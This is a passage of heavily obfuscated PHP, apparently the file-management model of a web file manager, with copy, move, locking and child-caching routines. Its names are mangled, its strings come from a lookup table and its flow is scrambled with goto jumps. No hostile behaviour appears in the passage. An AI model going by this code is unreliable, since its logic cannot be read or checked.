$CòÁ©ó’œ¢ = $this->sourceInfo($BŠ¨ÚÇœÒã); if (!$CòÁ©ó’œ¢) { show_json(LNG($e¥‘×ä¾¾Ş[101]), !1); } goto CáŒÜÅµ¶º; CáŒÜÅµ¶º: } private function _lockParent($FÒ¦ï°çóò, $eÉğ›Ÿ¾Û, $b¿ğĞäÇéª) { if (!$this->autoLockSet) { return; } $b°õºáä = $this->sourceInfo($FÒ¦ï°çóò); if (!is_array($b°õºáä)) { return; } $bØÜØ­Á³¥ = array_reverse($this->parentLevelArray($b°õºáä[$_SERVER[¯Ò¬Èè][459]])); foreach ($bØÜØ­Á³¥ as $FÇ¦ÁæÊ·) { $this->_lockEvent($FÇ¦ÁæÊ·, $eÉğ›Ÿ¾Û, $b¿ğĞäÇéª); } } private function _lockEvent($cË¼Ğ½š, $BÍ”ÄŞêğ×, $E¤Î¶¿šÀ) { $d½Ìßõ™Ğç =& $_SERVER[¯Ò¬Èè]; if (!$this->autoLockSet) { return; } foreach ($BÍ”ÄŞêğ× as $cĞÁíÕéÒŒ) { $eöŠ½Ôİø² = $cĞÁíÕéÒŒ . $d½Ìßõ™Ğç[91] . $cË¼Ğ½š; if ($E¤Î¶¿šÀ && CacheLock::lockGet($d½Ìßõ™Ğç[509] . $eöŠ½Ôİø²)) { continue; } $this->_lockKey($eöŠ½Ôİø², $E¤Î¶¿šÀ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($EäŞ¼ˆµù£, $c°“ñàŠ–Ç = 1) { $EÚìÉ—’‡¬ = $_SERVER[¯Ò¬Èè][509] . md5($EäŞ¼ˆµù£); if ($c°“ñàŠ–Ç) { if (isset(self::$_lockItemArr[$EÚìÉ—’‡¬])) { return; } self::$_lockItemArr[$EÚìÉ—’‡¬] = 1; CacheLock::lock($EÚìÉ—’‡¬, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$EÚìÉ—’‡¬])) { return; } unset(self::$_lockItemArr[$EÚìÉ—’‡¬]); CacheLock::unlock($EÚìÉ—’‡¬); } } public function isParentOf($a†îÎ§ôÚÜ, $cŠ‘‰§öˆ”) { goto F‰ó‘ğ­¿Í; D˜‚Í„«‰­: return $cÌ¼µ‚÷êÏ; goto a½ö¾²íä; F‰ó‘ğ­¿Í: $b‡’„¯•Ù =& $_SERVER[¯Ò¬Èè]; $bë³ºÍÍÉá = $this->sourceInfo($a†îÎ§ôÚÜ); $c‚åè… = $this->sourceInfo($cŠ‘‰§öˆ”); goto Eâ‰à£‡ÉÌ; Eâ‰à£‡ÉÌ: $a‚ƒ˜È˜×‰ = $bë³ºÍÍÉá[$b‡’„¯•Ù[459]] . $bë³ºÍÍÉá[$b‡’„¯•Ù[369]] . $b‡’„¯•Ù[47]; $eË¤˜½ÔÁ¼ = $c‚åè…[$b‡’„¯•Ù[459]] . $c‚åè…[$b‡’„¯•Ù[369]] . $b‡’„¯•Ù[47]; $cÌ¼µ‚÷êÏ = strpos($eË¤˜½ÔÁ¼, $a‚ƒ˜È˜×‰) === 0; goto D˜‚Í„«‰­; a½ö¾²íä: } private $targetIsDelete = 0; public function copy($bø¶Ã Ÿà, $EíÖ¡ùé‚Æ, $AÕ˜ø•­Í = REPEAT_REPLACE, $f ¦ôó¹É = '') { goto aéÖÛÒÇå; e³œ‘ñä¬ø: $this->_childrenListClear(); $this->lockCopyEnd($bø¶Ã Ÿà); $this->lockWriteEnd($EíÖ¡ùé‚Æ, $CôÄáóÍã); goto eóíˆæ½¡µ; F´ÛÁ¦±¤: $this->targetIsDelete = intval($bÔêˆï½ó[$bÍ…ë†ƒÔÊ[397]]); $Eæ®ĞÑ´£ã = $this->fileNameExistCache($EíÖ¡ùé‚Æ, $bÔêˆï½ó[$bÍ…ë†ƒÔÊ[28]]); $cİä–²˜©² = $this->_copy($bø¶Ã Ÿà, $EíÖ¡ùé‚Æ, $AÕ˜ø•­Í, $A˜Öôİé¬½, !0, $f ¦ôó¹É); goto e³œ‘ñä¬ø; aéÖÛÒÇå: $bÍ…ë†ƒÔÊ =& $_SERVER[¯Ò¬Èè]; $bÔêˆï½ó = $this->sourceInfo($bø¶Ã Ÿà); $D„‡ÇšƒÂŒ = $this->sourceInfo($EíÖ¡ùé‚Æ); goto E¸Û˜©öÏŸ; E¸Û˜©öÏŸ: if (!$bÔêˆï½ó || !$D„‡ÇšƒÂŒ || $D„‡ÇšƒÂŒ[$bÍ…ë†ƒÔÊ[370]] != $bÍ…ë†ƒÔÊ[83]) { return !1; } if ($this->isParentOf($bø¶Ã Ÿà, $EíÖ¡ùé‚Æ)) { return !1; } $CôÄáóÍã = $f ¦ôó¹É ? $f ¦ôó¹É : $bÔêˆï½ó[$bÍ…ë†ƒÔÊ[28]]; goto b‰¾“¸µ°à; eóíˆæ½¡µ: if ($bÔêˆï½ó[$bÍ…ë†ƒÔÊ[370]] == $bÍ…ë†ƒÔÊ[83] && $Eæ®ĞÑ´£ã == $cİä–²˜©²) { $this->folderSizeResetChildren($Eæ®ĞÑ´£ã); } Model($bÍ…ë†ƒÔÊ[513])->addAll($A˜Öôİé¬½[$bÍ…ë†ƒÔÊ[511]], array(), !0); if ($Eæ®ĞÑ´£ã != $cİä–²˜©² || $bÔêˆï½ó[$bÍ…ë†ƒÔÊ[370]] == $bÍ…ë†ƒÔÊ[83]) { Model($bÍ…ë†ƒÔÊ[514])->eventCopy($cİä–²˜©²); } goto dæÎ¬ƒ‘»‡; dæÎ¬ƒ‘»‡: $this->saveAll($A˜Öôİé¬½[$bÍ…ë†ƒÔÊ[512]]); Model($bÍ…ë†ƒÔÊ[167])->linkAdd($A˜Öôİé¬½[$bÍ…ë†ƒÔÊ[510]]); $this->folderSizeReset($EíÖ¡ùé‚Æ); goto E³³æ¸Ïø‡; b‰¾“¸µ°à: $this->lockCopyStart($bø¶Ã Ÿà); $this->lockWriteStart($EíÖ¡ùé‚Æ, $CôÄáóÍã); $A˜Öôİé¬½ = array($bÍ…ë†ƒÔÊ[510] => array(), $bÍ…ë†ƒÔÊ[511] => array(), $bÍ…ë†ƒÔÊ[512] => array()); goto F´ÛÁ¦±¤; E³³æ¸Ïø‡: $this->updateModifyTime($EíÖ¡ùé‚Æ); return $cİä–²˜©²; goto EÕ‰Û´Š—; EÕ‰Û´Š—: } private function _copy($d¸ÆÑµ†ù’, $b‚à¡èÕÊ§, $bØ Ù‰ÊÂİ, &$a‹†ÃŠÌ‚, $D•‰ì¥·á—, $Dß¸’Èî†» = '') { goto C¯ÒÉÆÒê¶; B°È½ˆÔùŠ: $C‘Œ¯ĞÉêç = $Dß¸’Èî†» ? $Dß¸’Èî†» : $B‘¯ôŠ‘°¤[$a¢“ÙÌÚ×[28]]; $F†Ğò¼×¶ = $this->fileNameExistCache($b‚à¡èÕÊ§, $C‘Œ¯ĞÉêç); if ($D•‰ì¥·á—) { $this->_childrenAllMake($d¸ÆÑµ†ù’); if ($BŠ¶æÊ×ˆÙ && $F†Ğò¼×¶) { $this->_childrenAllMake($F†Ğò¼×¶); } } goto aÃ¡„—·½Ü; aÃ¡„—·½Ü: if (!$F†Ğò¼×¶) { return $this->_copyCreate($d¸ÆÑµ†ù’, $b‚à¡èÕÊ§, $C‘Œ¯ĞÉêç, $a‹†ÃŠÌ‚); } $EàëÈ±ßå‘ = $F†Ğò¼×¶; if ($BŠ¶æÊ×ˆÙ) { if ($bØ Ù‰ÊÂİ == REPEAT_RENAME_FOLDER) { $C‘Œ¯ĞÉêç = $this->fileNameAutoCache($b‚à¡èÕÊ§, $C‘Œ¯ĞÉêç, $bØ Ù‰ÊÂİ, $BŠ¶æÊ×ˆÙ); $EàëÈ±ßå‘ = $this->_copyCreate($d¸ÆÑµ†ù’, $b‚à¡èÕÊ§, $C‘Œ¯ĞÉêç, $a‹†ÃŠÌ‚); } else { $F°Å†Ş¤œ = $this->_childrenList($d¸ÆÑµ†ù’); foreach ($F°Å†Ş¤œ as $fĞÌĞãÄ®ˆ) { $this->_copy($fĞÌĞãÄ®ˆ[$a¢“ÙÌÚ×[369]], $F†Ğò¼×¶, $bØ Ù‰ÊÂİ, $a‹†ÃŠÌ‚, !1); } } } else { if ($bØ Ù‰ÊÂİ == REPEAT_RENAME || $bØ Ù‰ÊÂİ == REPEAT_RENAME_FOLDER) { $C‘Œ¯ĞÉêç = $this->fileNameAutoCache($b‚à¡èÕÊ§, $C‘Œ¯ĞÉêç, $bØ Ù‰ÊÂİ, $BŠ¶æÊ×ˆÙ); $EàëÈ±ßå‘ = $this->_copyCreate($d¸ÆÑµ†ù’, $b‚à¡èÕÊ§, $C‘Œ¯ĞÉêç, $a‹†ÃŠÌ‚); } else { if ($bØ Ù‰ÊÂİ == REPEAT_REPLACE) { $dòÑ†¦…ˆÃ = $this->sourceInfoCache($F†Ğò¼×¶); $f–ÓÉĞ­Šø = $this->fileHistory($dòÑ†¦…ˆÃ, $B‘¯ôŠ‘°¤[$a¢“ÙÌÚ×[419]], $B‘¯ôŠ‘°¤[$a¢“ÙÌÚ×[77]]); if ($f–ÓÉĞ­Šø) { $a‹†ÃŠÌ‚[$a¢“ÙÌÚ×[510]][] = $B‘¯ôŠ‘°¤[$a¢“ÙÌÚ×[419]]; } } else { if ($bØ Ù‰ÊÂİ == REPEAT_SKIP) { } } } Hook::trigger($a¢“ÙÌÚ×[515], array($a¢“ÙÌÚ×[516], $B‘¯ôŠ‘°¤, 0)); } goto d‰¹È“‡…„; C¯ÒÉÆÒê¶: $a¢“ÙÌÚ× =& $_SERVER[¯Ò¬Èè]; $B‘¯ôŠ‘°¤ = $this->sourceInfoCache($d¸ÆÑµ†ù’); $BŠ¶æÊ×ˆÙ = $B‘¯ôŠ‘°¤[$a¢“ÙÌÚ×[370]] == $a¢“ÙÌÚ×[83]; goto B°È½ˆÔùŠ; d‰¹È“‡…„: return $EàëÈ±ßå‘; goto eâãõ‚“±Ù; eâãõ‚“±Ù: } private function _copyCreate($aá¨›âäÑ¶, $D—é¨÷•™ , $aø•á Ì¡ñ, &$bğÜä½ÏÊƒ) { goto B¢“‘ˆôÖ­; aÄåƒ»Ì´õ: $this->chunkEventSet($b†¨š»ğÜª[524], array($b†¨š»ğÜª[525], $fù‡¨ˆàñ¿, $CÁÕ„ÉÓ‚ )); $this->saveAll($fÑ„Û£ôˆ); return $eä©½¨°ÓŠ; goto Aª™¹„«; B¢“‘ˆôÖ­: $b†¨š»ğÜª =& $_SERVER[¯Ò¬Èè]; $f’‡ôàßÏÜ = $this->sourceInfoCache($aá¨›âäÑ¶); $C±‚¨½±š = $this->sourceInfoCache($D—é¨÷•™ ); goto AÅ¿É—à‡Ú; aÓ­š”ˆ‰Ì: foreach ($bêšæÏèĞò as $cé’š±˜†õ) { $FÒÇ³´ƒ™Ï = $cé’š±˜†õ[$b†¨š»ğÜª[369]]; $e”ÕÃ¯„’± = $this->_childrenMatch($a‰Ÿçâëïè, $cé’š±˜†õ, $A˜¾…ğŸ²Æ); $BÚ‰§ã°ñ¹[] = array($b†¨š»ğÜª[369], $FÒÇ³´ƒ™Ï, $b†¨š»ğÜª[461], $e”ÕÃ¯„’±[$b†¨š»ğÜª[461]]); $fÑ„Û£ôˆ[] = array($b†¨š»ğÜª[369], $FÒÇ³´ƒ™Ï, $b†¨š»ğÜª[459], $e”ÕÃ¯„’±[$b†¨š»ğÜª[459]]); $this->_copyApplyMeta($cé’š±˜†õ, $bğÜä½ÏÊƒ); if ($cé’š±˜†õ[$b†¨š»ğÜª[370]] != $b†¨š»ğÜª[83]) { $bğÜä½ÏÊƒ[$b†¨š»ğÜª[510]][] = $cé’š±˜†õ[$b†¨š»ğÜª[419]]; } } $this->chunkEventSet($b†¨š»ğÜª[522], array($b†¨š»ğÜª[523], $fù‡¨ˆàñ¿, $CÁÕ„ÉÓ‚ )); $this->saveAll($BÚ‰§ã°ñ¹); goto aÄåƒ»Ì´õ; a‰ô„°¯šÛ: $this->_childrenListAll($aá¨›âäÑ¶, $EÀîÕŸËïİ); $CÁÕ„ÉÓ‚  = count($EÀîÕŸËïİ); if ($CÁÕ„ÉÓ‚  == 0) { return $eä©½¨°ÓŠ; } goto E’¦Šê˜Ëá; bİ¤÷®ä¼œ: $eä©½¨°ÓŠ = $this->add($fù‡¨ˆàñ¿); $E›¢é¦øøè = array($b†¨š»ğÜª[369] => $eä©½¨°ÓŠ, $b†¨š»ğÜª[28] => $aø•á Ì¡ñ); $this->_copyApplyMeta($E›¢é¦øøè, $bğÜä½ÏÊƒ); goto dóÒõçÂò¸; AŠĞÕÙÂ…¢: $this->addAll($bæçÑ¥Ş‘‰, array(), !1); $bêšæÏèĞò = $this->where(array($b†¨š»ğÜª[461] => $eä©½¨°ÓŠ))->select(); $a‰Ÿçâëïè = $this->_childrenMakeRelation($EÀîÕŸËïİ, $bêšæÏèĞò); goto e¯ÁÅëóÄœ; AÅ¿É—à‡Ú: $fù‡¨ˆàñ¿ = $this->_makeItemData($f’‡ôàßÏÜ, $C±‚¨½±š, $aø•á Ì¡ñ); Hook::trigger($b†¨š»ğÜª[517], $fù‡¨ˆàñ¿); Hook::trigger($b†¨š»ğÜª[518], array($b†¨š»ğÜª[519], $fù‡¨ˆàñ¿, 0)); goto bİ¤÷®ä¼œ; e¯ÁÅëóÄœ: $a‰Ÿçâëïè[$aá¨›âäÑ¶] = $eä©½¨°ÓŠ; $BÚ‰§ã°ñ¹ = array(); $fÑ„Û£ôˆ = array(); goto aÓ­š”ˆ‰Ì; dóÒõçÂò¸: if ($f’‡ôàßÏÜ[$b†¨š»ğÜª[370]] != $b†¨š»ğÜª[83]) { $bğÜä½ÏÊƒ[$b†¨š»ğÜª[510]][] = $f’‡ôàßÏÜ[$b†¨š»ğÜª[419]]; return $eä©½¨°ÓŠ; } $EÀîÕŸËïİ = array(); $bæçÑ¥Ş‘‰ = array(); goto a‰ô„°¯šÛ; E’¦Šê˜Ëá: $A˜¾…ğŸ²Æ = $this->sourceInfo($eä©½¨°ÓŠ); foreach ($EÀîÕŸËïİ as $cé’š±˜†õ) { $A„¹™ÖÈ× = $this->_makeItemData($cé’š±˜†õ, $A˜¾…ğŸ²Æ, $cé’š±˜†õ[$b†¨š»ğÜª[28]]); $A„¹™ÖÈ×[$b†¨š»ğÜª[459]] = $cé’š±˜†õ[$b†¨š»ğÜª[459]]; $bæçÑ¥Ş‘‰[] = $A„¹™ÖÈ×; } $this->chunkEventSet($b†¨š»ğÜª[520], array($b†¨š»ğÜª[521], $fù‡¨ˆàñ¿, $CÁÕ„ÉÓ‚ )); goto AŠĞÕÙÂ…¢; Aª™¹„«: } private function _childrenMakeRelation($Aã­‹”‚‚Å, $f †ÃšÜ´) { $Béî®õÕå =& $_SERVER[¯Ò¬Èè]; $cÑøÂùˆŸ = array(); $eìÕÎãÌÓ™ = array(); foreach ($Aã­‹”‚‚Å as $FÄÀ¹êÒ§) { $AÒ§”¤ù´Ô = $FÄÀ¹êÒ§[$Béî®õÕå[28]] . $Béî®õÕå[8] . $FÄÀ¹êÒ§[$Béî®õÕå[459]]; $cÑøÂùˆŸ[$AÒ§”¤ù´Ô] = $FÄÀ¹êÒ§[$Béî®õÕå[369]]; } foreach ($f †ÃšÜ´ as $FÄÀ¹êÒ§) { $AÒ§”¤ù´Ô = $FÄÀ¹êÒ§[$Béî®õÕå[28]] . $Béî®õÕå[8] . $FÄÀ¹êÒ§[$Béî®õÕå[459]]; $E‰©Ãîå = $cÑøÂùˆŸ[$AÒ§”¤ù´Ô]; $eìÕÎãÌÓ™[$E‰©Ãîå] = $FÄÀ¹êÒ§[$Béî®õÕå[369]]; } return $eìÕÎãÌÓ™; } private function _childrenMatch($d³‡¨ˆ¹ëÌ, $EÎ›±ŒÂ‰, $e©ŸòÙ¯¹) { goto Eôê„¨Îµº; aÅ¶°˜í: foreach ($dïñî‚Ìñ• as $fì°µ‘œùÀ) { if (isset($d³‡¨ˆ¹ëÌ[$fì°µ‘œùÀ])) { $B»¨®ƒ´ .= $d³‡¨ˆ¹ëÌ[$fì°µ‘œùÀ] . $b¶ŒÆ„Á¢Ò[526]; } } $B»¨®ƒ´ = rtrim($B»¨®ƒ´, $b¶ŒÆ„Á¢Ò[47]) . $b¶ŒÆ„Á¢Ò[47]; $a’ë¸ê…¿å = $this->parentLevelArray($B»¨®ƒ´); goto B®Ù­ÓÄ»; B®Ù­ÓÄ»: $dŞòˆ£š = $a’ë¸ê…¿å[count($a’ë¸ê…¿å) - 1]; return array($b¶ŒÆ„Á¢Ò[461] => $dŞòˆ£š, $b¶ŒÆ„Á¢Ò[459] => $B»¨®ƒ´); goto cĞ‰Åæïä; Eôê„¨Îµº: $b¶ŒÆ„Á¢Ò =& $_SERVER[¯Ò¬Èè]; $B»¨®ƒ´ = $e©ŸòÙ¯¹[$b¶ŒÆ„Á¢Ò[459]]; $dïñî‚Ìñ• = $this->parentLevelArray($EÎ›±ŒÂ‰[$b¶ŒÆ„Á¢Ò[459]]); goto aÅ¶°˜í; cĞ‰Åæïä: } private function _makeItemData($AÒ¢Â„ÄÆ¸, $D‘ò¦Å¦ô“, $EÄ­ùƒ„ë) { $eèÌ´…Æ¶£ =& $_SERVER[¯Ò¬Èè]; $BÚ“˜ï¼ÔÃ = array($eèÌ´…Æ¶£[527] => $AÒ¢Â„ÄÆ¸[$eèÌ´…Æ¶£[370]], $eèÌ´…Æ¶£[386] => $EÄ­ùƒ„ë, $eèÌ´…Æ¶£[528] => $AÒ¢Â„ÄÆ¸[$eèÌ´…Æ¶£[372]], $eèÌ´…Æ¶£[420] => $AÒ¢Â„ÄÆ¸[$eèÌ´…Æ¶£[419]], $eèÌ´…Æ¶£[529] => $AÒ¢Â„ÄÆ¸[$eèÌ´…Æ¶£[77]], $eèÌ´…Æ¶£[530] => $D‘ò¦Å¦ô“[$eèÌ´…Æ¶£[371]], $eèÌ´…Æ¶£[531] => $D‘ò¦Å¦ô“[$eèÌ´…Æ¶£[456]], $eèÌ´…Æ¶£[532] => USER_ID, $eèÌ´…Æ¶£[533] => USER_ID, $eèÌ´…Æ¶£[368] => $D‘ò¦Å¦ô“[$eèÌ´…Æ¶£[369]], $eèÌ´…Æ¶£[534] => $D‘ò¦Å¦ô“[$eèÌ´…Æ¶£[459]] . $D‘ò¦Å¦ô“[$eèÌ´…Æ¶£[369]] . $eèÌ´…Æ¶£[47], $eèÌ´…Æ¶£[396] => 0, $eèÌ´…Æ¶£[535] => $eèÌ´…Æ¶£[33]); return $BÚ“˜ï¼ÔÃ; } private function _copyApplyMeta($eÑóù‹„Ì, &$FİÒõÏŠÍ) { $A¶µéˆÌßß =& $_SERVER[¯Ò¬Èè]; $Fò£œ¨—†Î = $eÑóù‹„Ì[$A¶µéˆÌßß[369]]; $B•®êÒøÊù = $eÑóù‹„Ì[$A¶µéˆÌßß[28]]; if (!isset($eÑóù‹„Ì[$A¶µéˆÌßß[536]]) || !$eÑóù‹„Ì[$A¶µéˆÌßß[536]] || $eÑóù‹„Ì[$A¶µéˆÌßß[536]] == $A¶µéˆÌßß[468]) { $FİÒõÏŠÍ[$A¶µéˆÌßß[512]][] = array($A¶µéˆÌßß[369], $Fò£œ¨—†Î, $A¶µéˆÌßß[536], short_id($Fò£œ¨—†Î)); } if (Input::check($B•®êÒøÊù, $A¶µéˆÌßß[537])) { $FİÒõÏŠÍ[$A¶µéˆÌßß[511]][] = array($A¶µéˆÌßß[369] => $Fò£œ¨—†Î, $A¶µéˆÌßß[89] => $A¶µéˆÌßß[416], $A¶µéˆÌßß[359] => str_replace($A¶µéˆÌßß[50], $A¶µéˆÌßß[33], Pinyin::encode($B•®êÒøÊù))); $FİÒõÏŠÍ[$A¶µéˆÌßß[511]][] = array($A¶µéˆÌßß[369] => $Fò£œ¨—†Î, $A¶µéˆÌßß[89] => $A¶µéˆÌßß[415], $A¶µéˆÌßß[359] => Pinyin::encode($B•®êÒøÊù, $A¶µéˆÌßß[538])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($f˜†„ÌÓ¤») { goto c¾ôåø¼ğ; FÑ†§ìº‹: $D“ã‹—˜íµ = array($aé‹ÂÊ¾—ª[459] => array($aé‹ÂÊ¾—ª[483], $eš‚Ğ…åÑÇ[$aé‹ÂÊ¾—ª[459]] . $f˜†„ÌÓ¤» . $aé‹ÂÊ¾—ª[484]), $aé‹ÂÊ¾—ª[397] => $this->targetIsDelete); $cÜ˜¦´Æª¤ = $this->field($E•œí‰ğ)->where($D“ã‹—˜íµ)->select(); if (!$cÜ˜¦´Æª¤) { return; } goto A¶¥ÛÑ®í‹; A¶¥ÛÑ®í‹: $cÜ˜¦´Æª¤ = array_to_keyvalue($cÜ˜¦´Æª¤, $aé‹ÂÊ¾—ª[369]); foreach ($cÜ˜¦´Æª¤ as $E„£ë¼¾¶) { $aÏ¢ëÚÁ = $E„£ë¼¾¶[$aé‹ÂÊ¾—ª[461]]; $f˜†„ÌÓ¤» = $E„£ë¼¾¶[$aé‹ÂÊ¾—ª[369]]; if (!isset($this->_childrenListCache[$f˜†„ÌÓ¤»]) && $E„£ë¼¾¶[$aé‹ÂÊ¾—ª[370]] == $aé‹ÂÊ¾—ª[83]) { $this->_childrenListCache[$f˜†„ÌÓ¤»] = array(); } if (!isset($this->_childrenListCache[$aÏ¢ëÚÁ])) { $this->_childrenListCache[$aÏ¢ëÚÁ] = array(); } $this->_childrenListCache[$aÏ¢ëÚÁ][$f˜†„ÌÓ¤»] = $E„£ë¼¾¶; $this->_childrenItemCache[$f˜†„ÌÓ¤»] = $E„£ë¼¾¶; } goto BóÁÆŸĞ“À; c¾ôåø¼ğ: $aé‹ÂÊ¾—ª =& $_SERVER[¯Ò¬Èè]; $eš‚Ğ…åÑÇ = $this->sourceInfo($f˜†„ÌÓ¤»); $E•œí‰ğ = $aé‹ÂÊ¾—ª[539]; goto FÑ†§ìº‹; BóÁÆŸĞ“À: } private function _childrenListAll($Aòš¢’‰áß, &$a±†Ë ¬‹Ó) { $c”ğáˆÈ‘½ =& $_SERVER[¯Ò¬Èè]; if (!isset($this->_childrenListCache[$Aòš¢’‰áß])) { return; } $fğª°–´ì = $this->_childrenListCache[$Aòš¢’‰áß]; foreach ($fğª°–´ì as $AîÓÊÚâ× => $BŞÅ—³’µ) { $a±†Ë ¬‹Ó[$AîÓÊÚâ×] = $BŞÅ—³’µ; if ($BŞÅ—³’µ[$c”ğáˆÈ‘½[370]] == $c”ğáˆÈ‘½[83]) { $this->_childrenListAll($AîÓÊÚâ×, $a±†Ë ¬‹Ó); } } } private function sourceInfoCache($Aê›¬Ù®Ë) { if (isset($this->_childrenItemCache[$Aê›¬Ù®Ë])) { return $this->_childrenItemCache[$Aê›¬Ù®Ë]; } return $this->sourceInfo($Aê›¬Ù®Ë); } private function _childrenList($còÂİá‹êµ) { if (isset($this->_childrenListCache[$còÂİá‹êµ])) { return $this->_childrenListCache[$còÂİá‹êµ]; } return $this->_childrenListSelect($còÂİá‹êµ); } private function _childrenListSelect($bŸôÅ‹‡¸Ç) { goto aœï¨ÊŞ§Ã; c»Ÿ’ââ”ö: $A¤‹“®ÀŠ­ = $A¤‹“®ÀŠ­ ? $A¤‹“®ÀŠ­ : array(); $FâæğªÕ‚ = array_to_keyvalue($A¤‹“®ÀŠ­, $BçÎİèŸ‹â[369]); $this->_childrenListCache[$bŸôÅ‹‡¸Ç] = $FâæğªÕ‚; goto Fâáº•ğå; Fâáº•ğå: foreach ($FâæğªÕ‚ as $bŸôÅ‹‡¸Ç => $Eß†Òôàì) { $this->_childrenItemCache[$bŸôÅ‹‡¸Ç] = $Eß†Òôàì; } return $FâæğªÕ‚; goto e‡ù•¤Ùº; aœï¨ÊŞ§Ã: $BçÎİèŸ‹â =& $_SERVER[¯Ò¬Èè]; $A±îƒâòåô = array($BçÎİèŸ‹â[461] => $bŸôÅ‹‡¸Ç, $BçÎİèŸ‹â[397] => $this->targetIsDelete); $A¤‹“®ÀŠ­ = $this->where($A±îƒâòåô)->select(); goto c»Ÿ’ââ”ö; e‡ù•¤Ùº: } private function fileNameExistCache($EÂ‡ª”ª– , $eøóõ¼‘Í) { $cê—ö‚ÜÓ =& $_SERVER[¯Ò¬Èè]; $eøóõ¼‘Í = strtolower($eøóõ¼‘Í); $eéõŠ¥À£ = $this->_childrenList($EÂ‡ª”ª– ); foreach ($eéõŠ¥À£ as $AÚ—¼„Ó‚ƒ) { if ($eøóõ¼‘Í == strtolower($AÚ—¼„Ó‚ƒ[$cê—ö‚ÜÓ[28]])) { return $AÚ—¼„Ó‚ƒ[$cê—ö‚ÜÓ[369]]; } } return !1; } private function fileNameAutoCache($eÙÅ¯Š‡¥¸, $AÕ½ñò¢Œœ, $dë»İ¨æ»´, $Dš˜ìÇ¶Œ) { $aÁˆİ¦À­— =& $_SERVER[¯Ò¬Èè]; $cÊÜá†Å·Ø = $this->_childrenList($eÙÅ¯Š‡¥¸); $CòÜ˜Ù™ = array_to_keyvalue($cÊÜá†Å·Ø, $aÁˆİ¦À­—[33], $aÁˆİ¦À­—[28]); return $this->fileNameAutoGet($CòÜ˜Ù™, $AÕ½ñò¢Œœ, $dë»İ¨æ»´, $Dš˜ìÇ¶Œ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Bæ²®ã œß, $dÄñ²ò×’, $eä£„á¿Ôó = REPEAT_REPLACE, $C“ùãÜƒåô = '') { goto fØ“šïÉŠ½; C¡­ôŒ¢¡³: $this->lockMoveEnd($Bæ²®ã œß); $this->lockWriteEnd($dÄñ²ò×’, $cä·óˆ®×¨); $this->folderSizeReset($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[461]]); goto B—ÍŠ¡ß‡; B—ÍŠ¡ß‡: $this->folderSizeReset($dÄñ²ò×’); $EÃÚÌ¿Ÿìß = array($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[461]], $dÄñ²ò×’); if ($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[370]] == $dåÃ¶‚‘ÅÇ[83]) { $EÃÚÌ¿Ÿìß[] = $Bæ²®ã œß; } goto B×´…»õ¯±; dŠ´±•®›: $A±ò¿ª§¦œ = $this->fileNameExistCache($dÄñ²ò×’, $bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[28]]); $f¢Ã¥‰„¼† = $this->_move($Bæ²®ã œß, $dÄñ²ò×’, $eä£„á¿Ôó, $CôßŸî¶Œë, $C“ùãÜƒåô); $this->sourceCacheClear(); goto fÃ¨¿éÊ†; Eè¼ŠÀ± : if ($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[461]] == $A¨¢íÓø¿[$dåÃ¶‚‘ÅÇ[369]]) { if ($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[397]] == $dåÃ¶‚‘ÅÇ[83]) { Model($dåÃ¶‚‘ÅÇ[395])->restore(array($Bæ²®ã œß)); } return $Bæ²®ã œß; } $b¸¢²¡Úôñ = $this->pathInfoMore($Bæ²®ã œß); if ($this->isParentOf($Bæ²®ã œß, $dÄñ²ò×’)) { return !1; } goto Dõˆ‚ø®„à; Dõˆ‚ø®„à: if (!$bÃ‚Á‚­¼ || !$A¨¢íÓø¿ || $A¨¢íÓø¿[$dåÃ¶‚‘ÅÇ[370]] != $dåÃ¶‚‘ÅÇ[83]) { return !1; } Hook::trigger($dåÃ¶‚‘ÅÇ[540], $b¸¢²¡Úôñ); $this->targetIsDelete = intval($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[397]]); goto eãĞÄß§ÔÃ; B×´…»õ¯±: $this->updateModifyTime($EÃÚÌ¿Ÿìß); Model($dåÃ¶‚‘ÅÇ[514])->eventMove($Bæ²®ã œß, $bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[461]], $dÄñ²ò×’); Hook::trigger($dåÃ¶‚‘ÅÇ[541], $b¸¢²¡Úôñ); goto b³„‰Ã‚´¡; b³„‰Ã‚´¡: return $f¢Ã¥‰„¼†; goto E‡ç„°˜¢; eãĞÄß§ÔÃ: if ($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[461]] == $dÄñ²ò×’ && $C“ùãÜƒåô != $bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[28]]) { $aí£öõŠ›× = $this->fileNameExist($dÄñ²ò×’, $C“ùãÜƒåô); if ($aí£öõŠ›× && $bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[370]] == $dåÃ¶‚‘ÅÇ[468]) { goto D‹¸ŒœÙÙ; D‹¸ŒœÙÙ: $A„Œ¼ç®å = $this->sourceInfo($aí£öõŠ›×); $FÇñ×ØÂÌØ = $this->fileHistory($A„Œ¼ç®å, $bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[419]], $bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[77]]); if (!$FÇñ×ØÂÌØ) { Model($dåÃ¶‚‘ÅÇ[422])->remove($bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[419]]); } goto b¥“¦á¼¦‹; cÎÒâˆ™¸Ü: return $aí£öõŠ›×; goto F£æ¬¼¢‰†; b¥“¦á¼¦‹: $this->removeNow($Bæ²®ã œß, !1); $this->folderSizeReset($dÄñ²ò×’); Hook::trigger($dåÃ¶‚‘ÅÇ[541], $b¸¢²¡Úôñ); goto cÎÒâˆ™¸Ü; F£æ¬¼¢‰†: } } $cä·óˆ®×¨ = $C“ùãÜƒåô ? $C“ùãÜƒåô : $bÃ‚Á‚­¼[$dåÃ¶‚‘ÅÇ[28]]; $this->lockMoveStart($Bæ²®ã œß); goto fÏì‡İÊ¶×; fÏì‡İÊ¶×: 